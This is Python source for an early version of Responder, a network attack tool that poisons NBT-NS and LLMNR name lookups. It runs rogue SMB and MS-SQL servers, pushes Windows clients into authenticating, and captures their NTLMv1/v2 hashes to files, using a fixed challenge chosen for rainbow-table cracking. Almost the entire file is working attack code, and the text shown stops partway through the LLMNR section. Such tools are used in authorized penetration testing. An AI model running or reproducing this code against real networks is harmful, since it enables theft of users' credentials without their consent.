#! /usr/bin/env python
# NBT-NS/LLMNR Responder
# Created by Laurent Gaffie
# Copyright (C) 2012 Trustwave Holdings, Inc.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

import sys,struct,SocketServer,re,optparse,socket,thread
from base64 import b64decode,b64encode
from odict import OrderedDict
from socket import inet_aton

parser = optparse.OptionParser(usage='python %prog -d PDC01 -i 10.20.30.40 -b 1 -s On -r 0',
                               prog=sys.argv[0],
                               )
parser.add_option('-d','--domain', action="store", dest="DomainName", help = "The target domain name, if not set, this tool will use WORKGROUP by default", metavar="PDC01", default="WORKGROUP")

parser.add_option('-i','--ip', action="store", help="The ip address to redirect the traffic to. (usually yours)", metavar="10.20.30.40",dest="OURIP")

parser.add_option('-b', '--basic',action="store", help="Set this to 1 if you want to return a Basic HTTP authentication. 0 will return an NTLM authentication.Default setting is NTLM auth", metavar="1",dest="Basic", choices=['0','1'], default=0)

parser.add_option('-s', '--server',action="store", help="Set this to On or Off to start the HTTP server", metavar="On",dest="on_off", choices=['On','Off'], default="On")

parser.add_option('-r', '--wredir',action="store", help="Set this to enable answers for netbios wredir suffix queries. Answering to wredir will likely break stuff on the network (like classics 'nbns spoofer' will). Default value is therefore set to Off (0)", metavar="0",dest="Wredirect", choices=['1','0'], default="0")

parser.add_option('-c','--challenge', action="store", dest="optChal", help = "The server challenge to set for NTLM authentication.  If not set, then defaults to 1122334455667788, the most common challenge for existing Rainbow Tables", metavar="1122334455667788", default="1122334455667788")

parser.add_option('-l','--logfile', action="store", dest="sessionLog", help = "Log file to use for Responder session. ", metavar="Responder-Session.log", default="Responder-Session.log")


options, args = parser.parse_args()

if options.OURIP is None:
   print "-i mandatory option is missing\n"
   parser.print_help()
   exit(-1)

#Logger
import logging
logging.basicConfig(filename=options.sessionLog,level=logging.INFO,format='%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
logging.warning('Responder Started')

# Set some vars.
DomainName = options.DomainName
OURIP = options.OURIP
Basic = options.Basic
On_Off = options.on_off.upper()
Wredirect = options.Wredirect
NumChal = options.optChal


def Show_Help(ExtraHelpData):
   help = "NBT Name Service/LLMNR Answerer 1.0.\nPlease send bugs/comments to: lgaffie@trustwave.com\nTo kill this script hit CRTL-C\n"
   help+= ExtraHelpData
   print help

Show_Help("[+]NBT-NS & LLMNR answerer started\n")

#Function used to write captured hashs to a file.
def WriteData(outfile,data):
    with open(outfile,"w") as outf:
         outf.write(data)
	 outf.write("\n")
         outf.close()

# Break out challenge for the hexidecimally challenged.  Also, avoid 2 different challenges by accident.
NumChal = "1122334455667788"
Challenge = ""
for i in range(0,len(NumChal),2):
    Challenge += NumChal[i:i+2].decode("hex")

#Simple NBNS Services.
W_REDIRECT   = "\x41\x41\x00"
FILE_SERVER  = "\x43\x41\x00"


#Packet class handling all packet generation (see odict.py).
class Packet():
    fields = OrderedDict([
        ("data", ""),
    ])
    def __init__(self, **kw):
        self.fields = OrderedDict(self.__class__.fields)
        for k,v in kw.items():
            if callable(v):
                self.fields[k] = v(self.fields[k])
            else:
                self.fields[k] = v
    def __str__(self):
        return "".join(map(str, self.fields.values()))

##################################################################################
#NBT NS Stuff
##################################################################################

#NBT-NS answer packet.
class NBT_Ans(Packet):
    fields = OrderedDict([
        ("Tid",           ""),
        ("Flags",         "\x85\x00"),
        ("Question",      "\x00\x00"),
        ("AnswerRRS",     "\x00\x01"),
        ("AuthorityRRS",  "\x00\x00"),
        ("AdditionalRRS", "\x00\x00"),
        ("NbtName",       ""),
        ("Type",          "\x00\x20"),
        ("Classy",        "\x00\x01"),
        ("TTL",           "\x00\x00\x00\xa5"),  
        ("Len",           "\x00\x06"),  
        ("Flags1",        "\x00\x00"),  
        ("IP",            "\x00\x00\x00\x00"),                      
    ])

    def calculate(self,data):
        self.fields["Tid"] = data[0:2]
        self.fields["NbtName"] = data[12:46]
        self.fields["IP"] = inet_aton(OURIP)

# Define what are we answering to.
def Validate_NBT_NS(data,Wredirect):
    if FILE_SERVER == data[43:46]:
       return True
    if Wredirect == "1":
       if W_REDIRECT == data[43:46]:
          return True
    else:
       return False

# NBT_NS Server class.
class NB(SocketServer.BaseRequestHandler):
    def server_bind(self):
       self.socket.setsockopt(SOL_SOCKET, SO_REUSEADDR,SO_REUSEPORT, 1)
       self.socket.bind(self.server_address)
       self.socket.setblocking(0)

    def handle(self):
        request, socket = self.request
        data = request
        if data[2:4] == "\x01\x10":
           if Validate_NBT_NS(data,Wredirect):
              buff = NBT_Ans()
              buff.calculate(data)
              for x in range(1):
                 socket.sendto(str(buff), self.client_address)
              print "NBT-NS Answer sent to: ", self.client_address[0]
              logging.warning('NBT-NS Answer sent to: %s'%(self.client_address[0]))

##################################################################################
#SMB Stuff
##################################################################################

#Calculate total SMB packet len.
def longueur(payload):
    length = struct.pack(">i", len(''.join(payload)))
    return length

#Set MID SMB Header field.
def midcalc(data):
    pack=data[34:36]
    return pack

#Set UID SMB Header field.
def uidcalc(data):
    pack=data[32:34]
    return pack

#Set PID SMB Header field.
def pidcalc(data):
    pack=data[30:32]
    return pack

#Set TID SMB Header field.
def tidcalc(data):
    pack=data[28:30]
    return pack

#SMB Header answer packet.
class SMBHeader(Packet):
    fields = OrderedDict([
        ("proto", "\xff\x53\x4d\x42"),
        ("cmd", "\x72"),
        ("errorcode", "\x00\x00\x00\x00" ),
        ("flag1", "\x80"),
        ("flag2", "\x00\x00"),
        ("pidhigh", "\x00\x00"),
        ("signature", "\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("reserved", "\x00\x00"),
        ("tid", "\x00\x00"),
        ("pid", "\xff\xfe"),
        ("uid", "\x00\x00"),
        ("mid", "\x00\x00"),
    ])

#SMB Negotiate Answer packet.
class SMBNegoAns(Packet):
    fields = OrderedDict([
        ("Wordcount",    "\x11"),
        ("Dialect",      ""),
        ("Securitymode", "\x03"),
        ("MaxMpx",       "\x32\x00"),
        ("MaxVc",        "\x01\x00"),
        ("Maxbuffsize",  "\x04\x41\x00\x00"),
        ("Maxrawbuff",   "\x00\x00\x01\x00"),
        ("Sessionkey",   "\x00\x00\x00\x00"),
        ("Capabilities", "\xfc\x3e\x01\x00"),
        ("Systemtime",   "\x84\xd6\xfb\xa3\x01\x35\xcd\x01"),
        ("Srvtimezone",  "\x2c\x01"),
        ("Keylength",    "\x08"),
        ("Bcc",          "\x10\x00"),
        ("Key",          "\x0d\x0d\x0d\x0d\x0d\x0d\x0d\x0d"),
        ("Domain",       "SMB"),
        ("DomainNull",   "\x00\x00"),
        ("Server",       "SMB-TOOLKIT"),
        ("ServerNull",   "\x00\x00"),
    ])

    def calculate(self):
        ##Convert first..
        self.fields["Domain"] = self.fields["Domain"].encode('utf-16le')
        self.fields["Server"] = self.fields["Server"].encode('utf-16le')
        ##Then calculate.
        CompleteBCCLen =  str(self.fields["Key"])+str(self.fields["Domain"])+str(self.fields["DomainNull"])+str(self.fields["Server"])+str(self.fields["ServerNull"])
        self.fields["Bcc"] = struct.pack("<h",len(CompleteBCCLen))
        self.fields["Keylength"] = struct.pack("<h",len(self.fields["Key"]))[0]

# SMB Session/Tree Answer.
class SMBSessTreeAns(Packet):
    fields = OrderedDict([
        ("Wordcount",       "\x03"),
        ("Command",         "\x75"), 
        ("Reserved",        "\x00"),
        ("AndXoffset",      "\x4e\x00"),
        ("Action",          "\x01\x00"),
        ("Bcc",             "\x25\x00"),
        ("NativeOs",        "Windows 5.1"),
        ("NativeOsNull",    "\x00"),
        ("NativeLan",       "Windows 2000 LAN Manager"),
        ("NativeLanNull",   "\x00"),
        ("WordcountTree",   "\x03"),
        ("AndXCommand",     "\xff"),
        ("Reserved1",       "\x00"),
        ("AndxOffset",      "\x00\x00"),
        ("OptionalSupport", "\x01\x00"),
        ("Bcc2",            "\x08\x00"),
        ("Service",         "A:"),
        ("ServiceNull",     "\x00"),
        ("FileSystem",      "NTFS"),
        ("FileSystemNull",  "\x00"),

    ])

    def calculate(self):
        ##AndxOffset
        CalculateCompletePacket = str(self.fields["Wordcount"])+str(self.fields["Command"])+str(self.fields["Reserved"])+str(self.fields["AndXoffset"])+str(self.fields["Action"])+str(self.fields["Bcc"])+str(self.fields["NativeOs"])+str(self.fields["NativeOsNull"])+str(self.fields["NativeLan"])+str(self.fields["NativeLanNull"])

        self.fields["AndXoffset"] = struct.pack("<i", len(CalculateCompletePacket)+32)[:2]#SMB Header is *always* 32.
        ##BCC 1 and 2
        CompleteBCCLen =  str(self.fields["NativeOs"])+str(self.fields["NativeOsNull"])+str(self.fields["NativeLan"])+str(self.fields["NativeLanNull"])
        self.fields["Bcc"] = struct.pack("<h",len(CompleteBCCLen))
        CompleteBCC2Len = str(self.fields["Service"])+str(self.fields["ServiceNull"])+str(self.fields["FileSystem"])+str(self.fields["FileSystemNull"])
        self.fields["Bcc2"] = struct.pack("<h",len(CompleteBCC2Len))

#Empty SMB Session packet, used when we return INVALID_LOGON.
class SMBSessEmpty(Packet):
    fields = OrderedDict([
        ("Empty",       "\x00\x00\x00"),
    ])

#Function used to parse SMB NTLMv1/v2 
def ParseHash(data,client):
  try:
    lenght = struct.unpack('<H',data[43:45])[0]
    LMhashLen = struct.unpack('<H',data[51:53])[0]
    NthashLen = struct.unpack('<H',data[53:55])[0]
    Bcc = struct.unpack('<H',data[63:65])[0]
    if NthashLen > 60:
       Hash = data[65+LMhashLen:65+LMhashLen+NthashLen]
       logging.warning('[+]SMB-NTLMv2 hash captured from :%s'%(client))
       print "[+]SMB-NTLMv2 hash captured from :",client
       outfile = "SMB-NTLMv2-Client-"+client+".txt"
       pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
       var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
       Username, Domain = tuple(var)
       Writehash = Username+"::"+Domain+":"+NumChal+":"+Hash.encode('hex')[:32].upper()+":"+Hash.encode('hex')[32:].upper()
       WriteData(outfile,Writehash)
       print "[+]SMB-NTLMv2 complete hash is :",Writehash
       logging.warning('[+]SMB-NTLMv2 complete hash is :%s'%(Writehash))
       print "Username : ",Username
       logging.warning('[+]SMB-NTLMv2 Username:%s'%(Username))
       print "Domain (if joined, if not then computer name) : ",Domain
       logging.warning('[+]SMB-NTLMv2 Domain (if joined, if not then computer name) :%s'%(Domain))
    if NthashLen == 24:
       print "[+]SMB-NTLMv1 hash captured from : ",client
       logging.warning('[+]SMB-NTLMv1 hash captured from :%s'%(client))
       outfile = "SMB-NTLMv1-Client-"+client+".txt"
       pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
       var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
       Username, Domain = tuple(var)
       writehash = Username+"::"+Domain+":"+data[65:65+LMhashLen].encode('hex').upper()+":"+data[65+LMhashLen:65+LMhashLen+NthashLen].encode('hex').upper()+":"+NumChal
       WriteData(outfile,writehash)
       print "[+]SMB complete hash is :", writehash
       logging.warning('[+]SMB-NTLMv1 complete hash is :%s'%(writehash))
       print "Username : ",Username
       logging.warning('[+]SMB-NTLMv1 Username:%s'%(Username))
       print "Domain (if joined, if not then computer name) : ",Domain
       logging.warning('[+]SMB-NTLMv1 Domain (if joined, if not then computer name) :%s'%(Domain))
    packet = data[:]
    a = re.search('(\\x5c\\x00\\x5c.*.\\x00\\x00\\x00)', packet)
    if a:
       quote = "Share requested: "+a.group(0)
       print quote.replace('\x00','')
       logging.warning(quote.replace('\x00',''))
  except Exception:
           raise

#Detect if SMB auth was Anonymous
def Is_Anonymous(data):
    LMhashLen = struct.unpack('<H',data[51:53])[0]
    if LMhashLen == 0 or LMhashLen == 1:
       print "SMB Anonymous login requested, trying to force client to auth with credz."
       return True
    else:
       return False

#Function used to know which dialect number to return for NT LM 0.12
def Parse_Nego_Dialect(data):
    DialectStart = data[40:]
    pack = tuple(DialectStart.split('\x02'))[:10]
    var = [e.replace('\x00','') for e in DialectStart.split('\x02')[:10]]
    test = tuple(var)
    if test[0] == "NT LM 0.12":
       return "\x00\x00"
    if test[1] == "NT LM 0.12":
       return "\x01\x00"
    if test[2] == "NT LM 0.12":
       return "\x02\x00"
    if test[3] == "NT LM 0.12":
       return "\x03\x00"
    if test[4] == "NT LM 0.12":
       return "\x04\x00"
    if test[5] == "NT LM 0.12":
       return "\x05\x00"
    if test[6] == "NT LM 0.12":
       return "\x06\x00"
    if test[7] == "NT LM 0.12":
       return "\x07\x00"
    if test[8] == "NT LM 0.12":
       return "\x08\x00"
    if test[9] == "NT LM 0.12":
       return "\x09\x00"
    if test[10] == "NT LM 0.12":
       return "\x0a\x00"

#SMB Server class.
class SMB1(SocketServer.BaseRequestHandler):
    def server_bind(self):
       self.socket.setsockopt(SOL_SOCKET, SO_REUSEADDR,SO_REUSEPORT, 1)
       self.socket.bind(self.server_address)
       self.socket.setblocking(0)
       self.socket.setdefaulttimeout(1)

    def handle(self):
        try:
           while True:
              data = self.request.recv(1024)
              self.request.settimeout(0.1)
              ##session request 139
              #print data.encode("hex")
              if data[0] == "\x81":
                buffer0 = "\x82\x00\x00\x00"         
                self.request.send(buffer0)
                data = self.request.recv(1024)
             ##Negotiate proto answer.
              if data[8:10] == "\x72\x00":
                print "SMB connection from:",self.client_address[0]
                # Customize SMB answer.
                head = SMBHeader(cmd="\x72",flag1="\x98", flag2="\x53\xc8",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
                t = SMBNegoAns(Dialect=Parse_Nego_Dialect(data),Domain=DomainName,Key=Challenge)
                t.calculate()
                final = t 
                packet1 = str(head)+str(final)
                buffer1 = longueur(packet1)+packet1  
                self.request.send(buffer1)
                data = self.request.recv(1024)
                ##Session Setup AndX Request
              if data[8:10] == "\x73\x00":
                if Is_Anonymous(data):
                   head = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x53\xc8",errorcode="\x6d\x00\x00\xC0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
                   final = SMBSessEmpty()
                   packet1 = str(head)+str(final)
                   buffer1 = longueur(packet1)+packet1  
                   self.request.send(buffer1)
                else:
                   ParseHash(data,self.client_address[0])
                   head = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x00\x00",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
                   t = SMBSessTreeAns()
                   t.calculate()
                   final = t 
                   packet1 = str(head)+str(final)
                   buffer1 = longueur(packet1)+packet1  
                   self.request.send(buffer1)
                   data = self.request.recv(1024)

        except Exception:
           pass #no need to print errors..
           self.request.close()

##################################################################################
#SQL Stuff
##################################################################################

#MS-SQL Pre-login packet class
class MSSQLPreLoginAnswer(Packet):
    fields = OrderedDict([
        ("PacketType",       "\x04"),
        ("Status",           "\x01"), 
        ("Len",              "\x00\x25"),
        ("SPID",             "\x00\x00"),
        ("PacketID",         "\x01"),
        ("Window",           "\x00"),
        ("TokenType",        "\x00"),
        ("VersionOffset",    "\x00\x15"),
        ("VersionLen",       "\x00\x06"),
        ("TokenType1",       "\x01"),
        ("EncryptionOffset", "\x00\x1b"),
        ("EncryptionLen",    "\x00\x01"),
        ("TokenType2",       "\x02"),
        ("InstOptOffset",    "\x00\x1c"),
        ("InstOptLen",       "\x00\x01"),
        ("TokenTypeThrdID",  "\x03"),
        ("ThrdIDOffset",     "\x00\x1d"),
        ("ThrdIDLen",        "\x00\x00"),
        ("ThrdIDTerminator", "\xff"),
        ("VersionStr",       "\x09\x00\x0f\xc3"),
        ("SubBuild",         "\x00\x00"),
        ("EncryptionStr",    "\x02"),
        ("InstOptStr",       "\x00"),
        ]) 

    def calculate(self):
        CalculateCompletePacket = str(self.fields["PacketType"])+str(self.fields["Status"])+str(self.fields["Len"])+str(self.fields["SPID"])+str(self.fields["PacketID"])+str(self.fields["Window"])+str(self.fields["TokenType"])+str(self.fields["VersionOffset"])+str(self.fields["VersionLen"])+str(self.fields["TokenType1"])+str(self.fields["EncryptionOffset"])+str(self.fields["EncryptionLen"])+str(self.fields["TokenType2"])+str(self.fields["InstOptOffset"])+str(self.fields["InstOptLen"])+str(self.fields["TokenTypeThrdID"])+str(self.fields["ThrdIDOffset"])+str(self.fields["ThrdIDLen"])+str(self.fields["ThrdIDTerminator"])+str(self.fields["VersionStr"])+str(self.fields["SubBuild"])+str(self.fields["EncryptionStr"])+str(self.fields["InstOptStr"])

        VersionOffset = str(self.fields["TokenType"])+str(self.fields["VersionOffset"])+str(self.fields["VersionLen"])+str(self.fields["TokenType1"])+str(self.fields["EncryptionOffset"])+str(self.fields["EncryptionLen"])+str(self.fields["TokenType2"])+str(self.fields["InstOptOffset"])+str(self.fields["InstOptLen"])+str(self.fields["TokenTypeThrdID"])+str(self.fields["ThrdIDOffset"])+str(self.fields["ThrdIDLen"])+str(self.fields["ThrdIDTerminator"])

        EncryptionOffset = VersionOffset+str(self.fields["VersionStr"])+str(self.fields["SubBuild"])

        InstOpOffset = EncryptionOffset+str(self.fields["EncryptionStr"])
         
        ThrdIDOffset = InstOpOffset+str(self.fields["InstOptStr"])

        self.fields["Len"] = struct.pack(">h",len(CalculateCompletePacket))
        #Version
        self.fields["VersionLen"] = struct.pack(">h",len(self.fields["VersionStr"]+self.fields["SubBuild"]))
        self.fields["VersionOffset"] = struct.pack(">h",len(VersionOffset))
        #Encryption
        self.fields["EncryptionLen"] = struct.pack(">h",len(self.fields["EncryptionStr"]))
        self.fields["EncryptionOffset"] = struct.pack(">h",len(EncryptionOffset))
        #InstOpt
        self.fields["InstOptLen"] = struct.pack(">h",len(self.fields["InstOptStr"]))
        self.fields["EncryptionOffset"] = struct.pack(">h",len(InstOpOffset))
        #ThrdIDOffset
        self.fields["ThrdIDOffset"] = struct.pack(">h",len(ThrdIDOffset))

#MS-SQL NTLM Negotiate packet class
class MSSQLNTLMChallengeAnswer(Packet):
    fields = OrderedDict([
        ("PacketType",       "\x04"), 
        ("Status",           "\x01"),
        ("Len",              "\x00\xc7"),
        ("SPID",             "\x00\x00"),
        ("PacketID",         "\x01"),
        ("Window",           "\x00"),
        ("TokenType",        "\xed"),
        ("SSPIBuffLen",      "\xbc\x00"),
        ("Signature",        "NTLMSSP"),
        ("SignatureNull",    "\x00"),
        ("MessageType",      "\x02\x00\x00\x00"),
        ("TargetNameLen",    "\x06\x00"),
        ("TargetNameMaxLen", "\x06\x00"),
        ("TargetNameOffset", "\x38\x00\x00\x00"),
        ("NegoFlags",        "\x05\x02\x89\xa2"),
        ("ServerChallenge",  Challenge),
        ("Reserved",         "\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("TargetInfoLen",    "\x7e\x00"),
        ("TargetInfoMaxLen", "\x7e\x00"),
        ("TargetInfoOffset", "\x3e\x00\x00\x00"),
        ("NTLMOsVersion",    "\x05\x02\xce\x0e\x00\x00\x00\x0f"),
        ("TargetNameStr",    "SMB"),
        ("Av1",              "\x02\x00"),#nbt name
        ("Av1Len",           "\x06\x00"),
        ("Av1Str",           "SMB"),
        ("Av2",              "\x01\x00"),#Server name
        ("Av2Len",           "\x14\x00"),
        ("Av2Str",           "SMB-TOOLKIT"),
        ("Av3",              "\x04\x00"),#Full Domain name
        ("Av3Len",           "\x12\x00"),
        ("Av3Str",           "smb.local"),
        ("Av4",              "\x03\x00"),#Full machine domain name
        ("Av4Len",           "\x28\x00"),
        ("Av4Str",           "server2003.smb.local"),
        ("Av5",              "\x05\x00"),#Domain Forest Name
        ("Av5Len",           "\x12\x00"),
        ("Av5Str",           "smb.local"),
        ("Av6",              "\x00\x00"),#AvPairs Terminator
        ("Av6Len",           "\x00\x00"),
        ]) 

    def calculate(self):
        ##First convert to uni
        self.fields["TargetNameStr"] = self.fields["TargetNameStr"].encode('utf-16le')
        self.fields["Av1Str"] = self.fields["Av1Str"].encode('utf-16le')
        self.fields["Av2Str"] = self.fields["Av2Str"].encode('utf-16le')
        self.fields["Av3Str"] = self.fields["Av3Str"].encode('utf-16le')
        self.fields["Av4Str"] = self.fields["Av4Str"].encode('utf-16le')
        self.fields["Av5Str"] = self.fields["Av5Str"].encode('utf-16le')
        ##Then calculate

        CalculateCompletePacket = str(self.fields["PacketType"])+str(self.fields["Status"])+str(self.fields["Len"])+str(self.fields["SPID"])+str(self.fields["PacketID"])+str(self.fields["Window"])+str(self.fields["TokenType"])+str(self.fields["SSPIBuffLen"])+str(self.fields["Signature"])+str(self.fields["SignatureNull"])+str(self.fields["MessageType"])+str(self.fields["TargetNameLen"])+str(self.fields["TargetNameMaxLen"])+str(self.fields["TargetNameOffset"])+str(self.fields["NegoFlags"])+str(self.fields["ServerChallenge"])+str(self.fields["Reserved"])+str(self.fields["TargetInfoLen"])+str(self.fields["TargetInfoMaxLen"])+str(self.fields["TargetInfoOffset"])+str(self.fields["NTLMOsVersion"])+str(self.fields["TargetNameStr"])+str(self.fields["Av1"])+str(self.fields["Av1Len"])+str(self.fields["Av1Str"])+str(self.fields["Av2"])+str(self.fields["Av2Len"])+str(self.fields["Av2Str"])+str(self.fields["Av3"])+str(self.fields["Av3Len"])+str(self.fields["Av3Str"])+str(self.fields["Av4"])+str(self.fields["Av4Len"])+str(self.fields["Av4Str"])+str(self.fields["Av5"])+str(self.fields["Av5Len"])+str(self.fields["Av5Str"])+str(self.fields["Av6"])+str(self.fields["Av6Len"])

        CalculateSSPI = str(self.fields["Signature"])+str(self.fields["SignatureNull"])+str(self.fields["MessageType"])+str(self.fields["TargetNameLen"])+str(self.fields["TargetNameMaxLen"])+str(self.fields["TargetNameOffset"])+str(self.fields["NegoFlags"])+str(self.fields["ServerChallenge"])+str(self.fields["Reserved"])+str(self.fields["TargetInfoLen"])+str(self.fields["TargetInfoMaxLen"])+str(self.fields["TargetInfoOffset"])+str(self.fields["NTLMOsVersion"])+str(self.fields["TargetNameStr"])+str(self.fields["Av1"])+str(self.fields["Av1Len"])+str(self.fields["Av1Str"])+str(self.fields["Av2"])+str(self.fields["Av2Len"])+str(self.fields["Av2Str"])+str(self.fields["Av3"])+str(self.fields["Av3Len"])+str(self.fields["Av3Str"])+str(self.fields["Av4"])+str(self.fields["Av4Len"])+str(self.fields["Av4Str"])+str(self.fields["Av5"])+str(self.fields["Av5Len"])+str(self.fields["Av5Str"])+str(self.fields["Av6"])+str(self.fields["Av6Len"])

        CalculateNameOffset = str(self.fields["Signature"])+str(self.fields["SignatureNull"])+str(self.fields["MessageType"])+str(self.fields["TargetNameLen"])+str(self.fields["TargetNameMaxLen"])+str(self.fields["TargetNameOffset"])+str(self.fields["NegoFlags"])+str(self.fields["ServerChallenge"])+str(self.fields["Reserved"])+str(self.fields["TargetInfoLen"])+str(self.fields["TargetInfoMaxLen"])+str(self.fields["TargetInfoOffset"])+str(self.fields["NTLMOsVersion"])

        CalculateAvPairsOffset = CalculateNameOffset+str(self.fields["TargetNameStr"])

        CalculateAvPairsLen = str(self.fields["Av1"])+str(self.fields["Av1Len"])+str(self.fields["Av1Str"])+str(self.fields["Av2"])+str(self.fields["Av2Len"])+str(self.fields["Av2Str"])+str(self.fields["Av3"])+str(self.fields["Av3Len"])+str(self.fields["Av3Str"])+str(self.fields["Av4"])+str(self.fields["Av4Len"])+str(self.fields["Av4Str"])+str(self.fields["Av5"])+str(self.fields["Av5Len"])+str(self.fields["Av5Str"])+str(self.fields["Av6"])+str(self.fields["Av6Len"])

        self.fields["Len"] = struct.pack(">h",len(CalculateCompletePacket))
        self.fields["SSPIBuffLen"] = struct.pack("<i",len(CalculateSSPI))[:2]
        # Target Name Offsets
        self.fields["TargetNameOffset"] = struct.pack("<i", len(CalculateNameOffset))
        self.fields["TargetNameLen"] = struct.pack("<i", len(self.fields["TargetNameStr"]))[:2]
        self.fields["TargetNameMaxLen"] = struct.pack("<i", len(self.fields["TargetNameStr"]))[:2]
        #AvPairs Offsets
        self.fields["TargetInfoOffset"] = struct.pack("<i", len(CalculateAvPairsOffset))
        self.fields["TargetInfoLen"] = struct.pack("<i", len(CalculateAvPairsLen))[:2]
        self.fields["TargetInfoMaxLen"] = struct.pack("<i", len(CalculateAvPairsLen))[:2]
        #AvPairs StrLen
        self.fields["Av1Len"] = struct.pack("<i", len(str(self.fields["Av1Str"])))[:2]
        self.fields["Av2Len"] = struct.pack("<i", len(str(self.fields["Av2Str"])))[:2]
        self.fields["Av3Len"] = struct.pack("<i", len(str(self.fields["Av3Str"])))[:2]
        self.fields["Av4Len"] = struct.pack("<i", len(str(self.fields["Av4Str"])))[:2]
        self.fields["Av5Len"] = struct.pack("<i", len(str(self.fields["Av5Str"])))[:2]
        #AvPairs 6 len is always 00.

#This function parse SQL NTLMv1/v2 hash and dump it into a specific file.
def ParseSQLHash(data,client):
    SSPIStart = data[8:]
    LMhashLen = struct.unpack('<H',data[20:22])[0]
    LMhashOffset = struct.unpack('<H',data[24:26])[0]
    LMHash = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
    NthashLen = struct.unpack('<H',data[30:32])[0]
    if NthashLen == 24:
       print "[+]MSSQL NTLMv1 hash captured from :",client
       logging.warning('[+]MsSQL NTLMv1 hash captured from :%s'%(client))
       NthashOffset = struct.unpack('<H',data[32:34])[0]
       NtHash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
       DomainLen = struct.unpack('<H',data[36:38])[0]
       DomainOffset = struct.unpack('<H',data[40:42])[0]
       Domain = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
       print "Domain is :", Domain
       logging.warning('[+]MSSQL NTLMv1 Domain is :%s'%(Domain))
       UserLen = struct.unpack('<H',data[44:46])[0]
       UserOffset = struct.unpack('<H',data[48:50])[0]
       User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
       print "User is :", SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
       logging.warning('[+]MSSQL NTLMv1 User is :%s'%(SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')))
       outfile = "MSSQL-NTLMv1-Client-"+client+".txt"
       WriteData(outfile,User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal)
       print '[+]MSSQL NTLMv1 Complete hash is: %s'%(User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal)
       logging.warning('[+]MSSQL NTLMv1 Complete hash is: %s'%(User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal))
    if NthashLen > 60:
       print "[+]MSSQL NTLMv2 Hash captured from :",client
       logging.warning('[+]MsSQL NTLMv2 hash captured from :%s'%(client))
       DomainLen = struct.unpack('<H',data[36:38])[0]
       NthashOffset = struct.unpack('<H',data[32:34])[0]
       NthashLen = struct.unpack('<H',data[30:32])[0]
       Hash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
       DomainOffset = struct.unpack('<H',data[40:42])[0]
       Domain = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
       print "[+]MSSQL NTLMv2 Domain is :", Domain
       logging.warning('[+]MSSQL NTLMv2 Domain is :%s'%(Domain))
       UserLen = struct.unpack('<H',data[44:46])[0]
       UserOffset = struct.unpack('<H',data[48:50])[0]
       User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
       print "[+]MSSQL NTLMv2 User is :", SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
       logging.warning('[+]MSSQL NTLMv2 User is :%s'%(SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')))
       outfile = "MSSQL-NTLMv2-Client-"+client+".txt"
       Writehash = User+"::"+Domain+":"+NumChal+":"+Hash[:32].upper()+":"+Hash[32:].upper()
       WriteData(outfile,Writehash)
       print "[+]MSSQL NTLMv2 Complete Hash is : ", Writehash
       logging.warning('[+]MSSQL NTLMv2 Complete Hash is : %s'%(Writehash))

#MS-SQL server class.
class MSSQL(SocketServer.BaseRequestHandler):
    def server_bind(self):
       self.socket.setsockopt(SOL_SOCKET, SO_REUSEADDR,SO_REUSEPORT, 1)
       self.socket.bind(self.server_address)
       self.socket.setblocking(0)
       self.socket.setdefaulttimeout(0.1)

    def handle(self):
        try:
           while True:
              data = self.request.recv(1024)
              self.request.settimeout(0.1)
              ##Pre-Login Message
              if data[0] == "\x12":
                buffer0 = str(MSSQLPreLoginAnswer())        
                self.request.send(buffer0)
                data = self.request.recv(1024)
             ##NegoSSP
              if data[0] == "\x10":
                t = MSSQLNTLMChallengeAnswer()
                t.calculate()
                buffer1 = str(t) 
                self.request.send(buffer1)
                data = self.request.recv(1024)
                ##NegoSSP Auth
              if data[0] == "\x11":
                 ParseSQLHash(data,self.client_address[0])
        except Exception:
           pass
           self.request.close()

##################################################################################
#LLMNR Stuff
##################################################################################

#LLMNR Answer packet.
class LLMNRAns(Packet):
    fields = OrderedDict([
        ("Tid",              ""),
        ("Flags",            "\x80\x00"),
        ("Question",         "\x00\x01"),
        ("AnswerRRS",        "\x00\x01"),
        ("AuthorityRRS",     "\x00\x00"),
        ("AdditionalRRS",    "\x00\x00"),
        ("QuestionNameLen",  "\x09"),
        ("QuestionName",     ""),
        ("QuestionNameNull", "\x00"),
        ("Type",             "\x00\x01"),
        ("Class",            "\x00\x01"),
        ("AnswerNameLen",    "\x09"),  
        ("AnswerName",       ""),
        ("AnswerNameNull",   "\x00"),    
        ("Type1",            "\x00\x01"),  
        ("Class1",           "\x00\x01"),
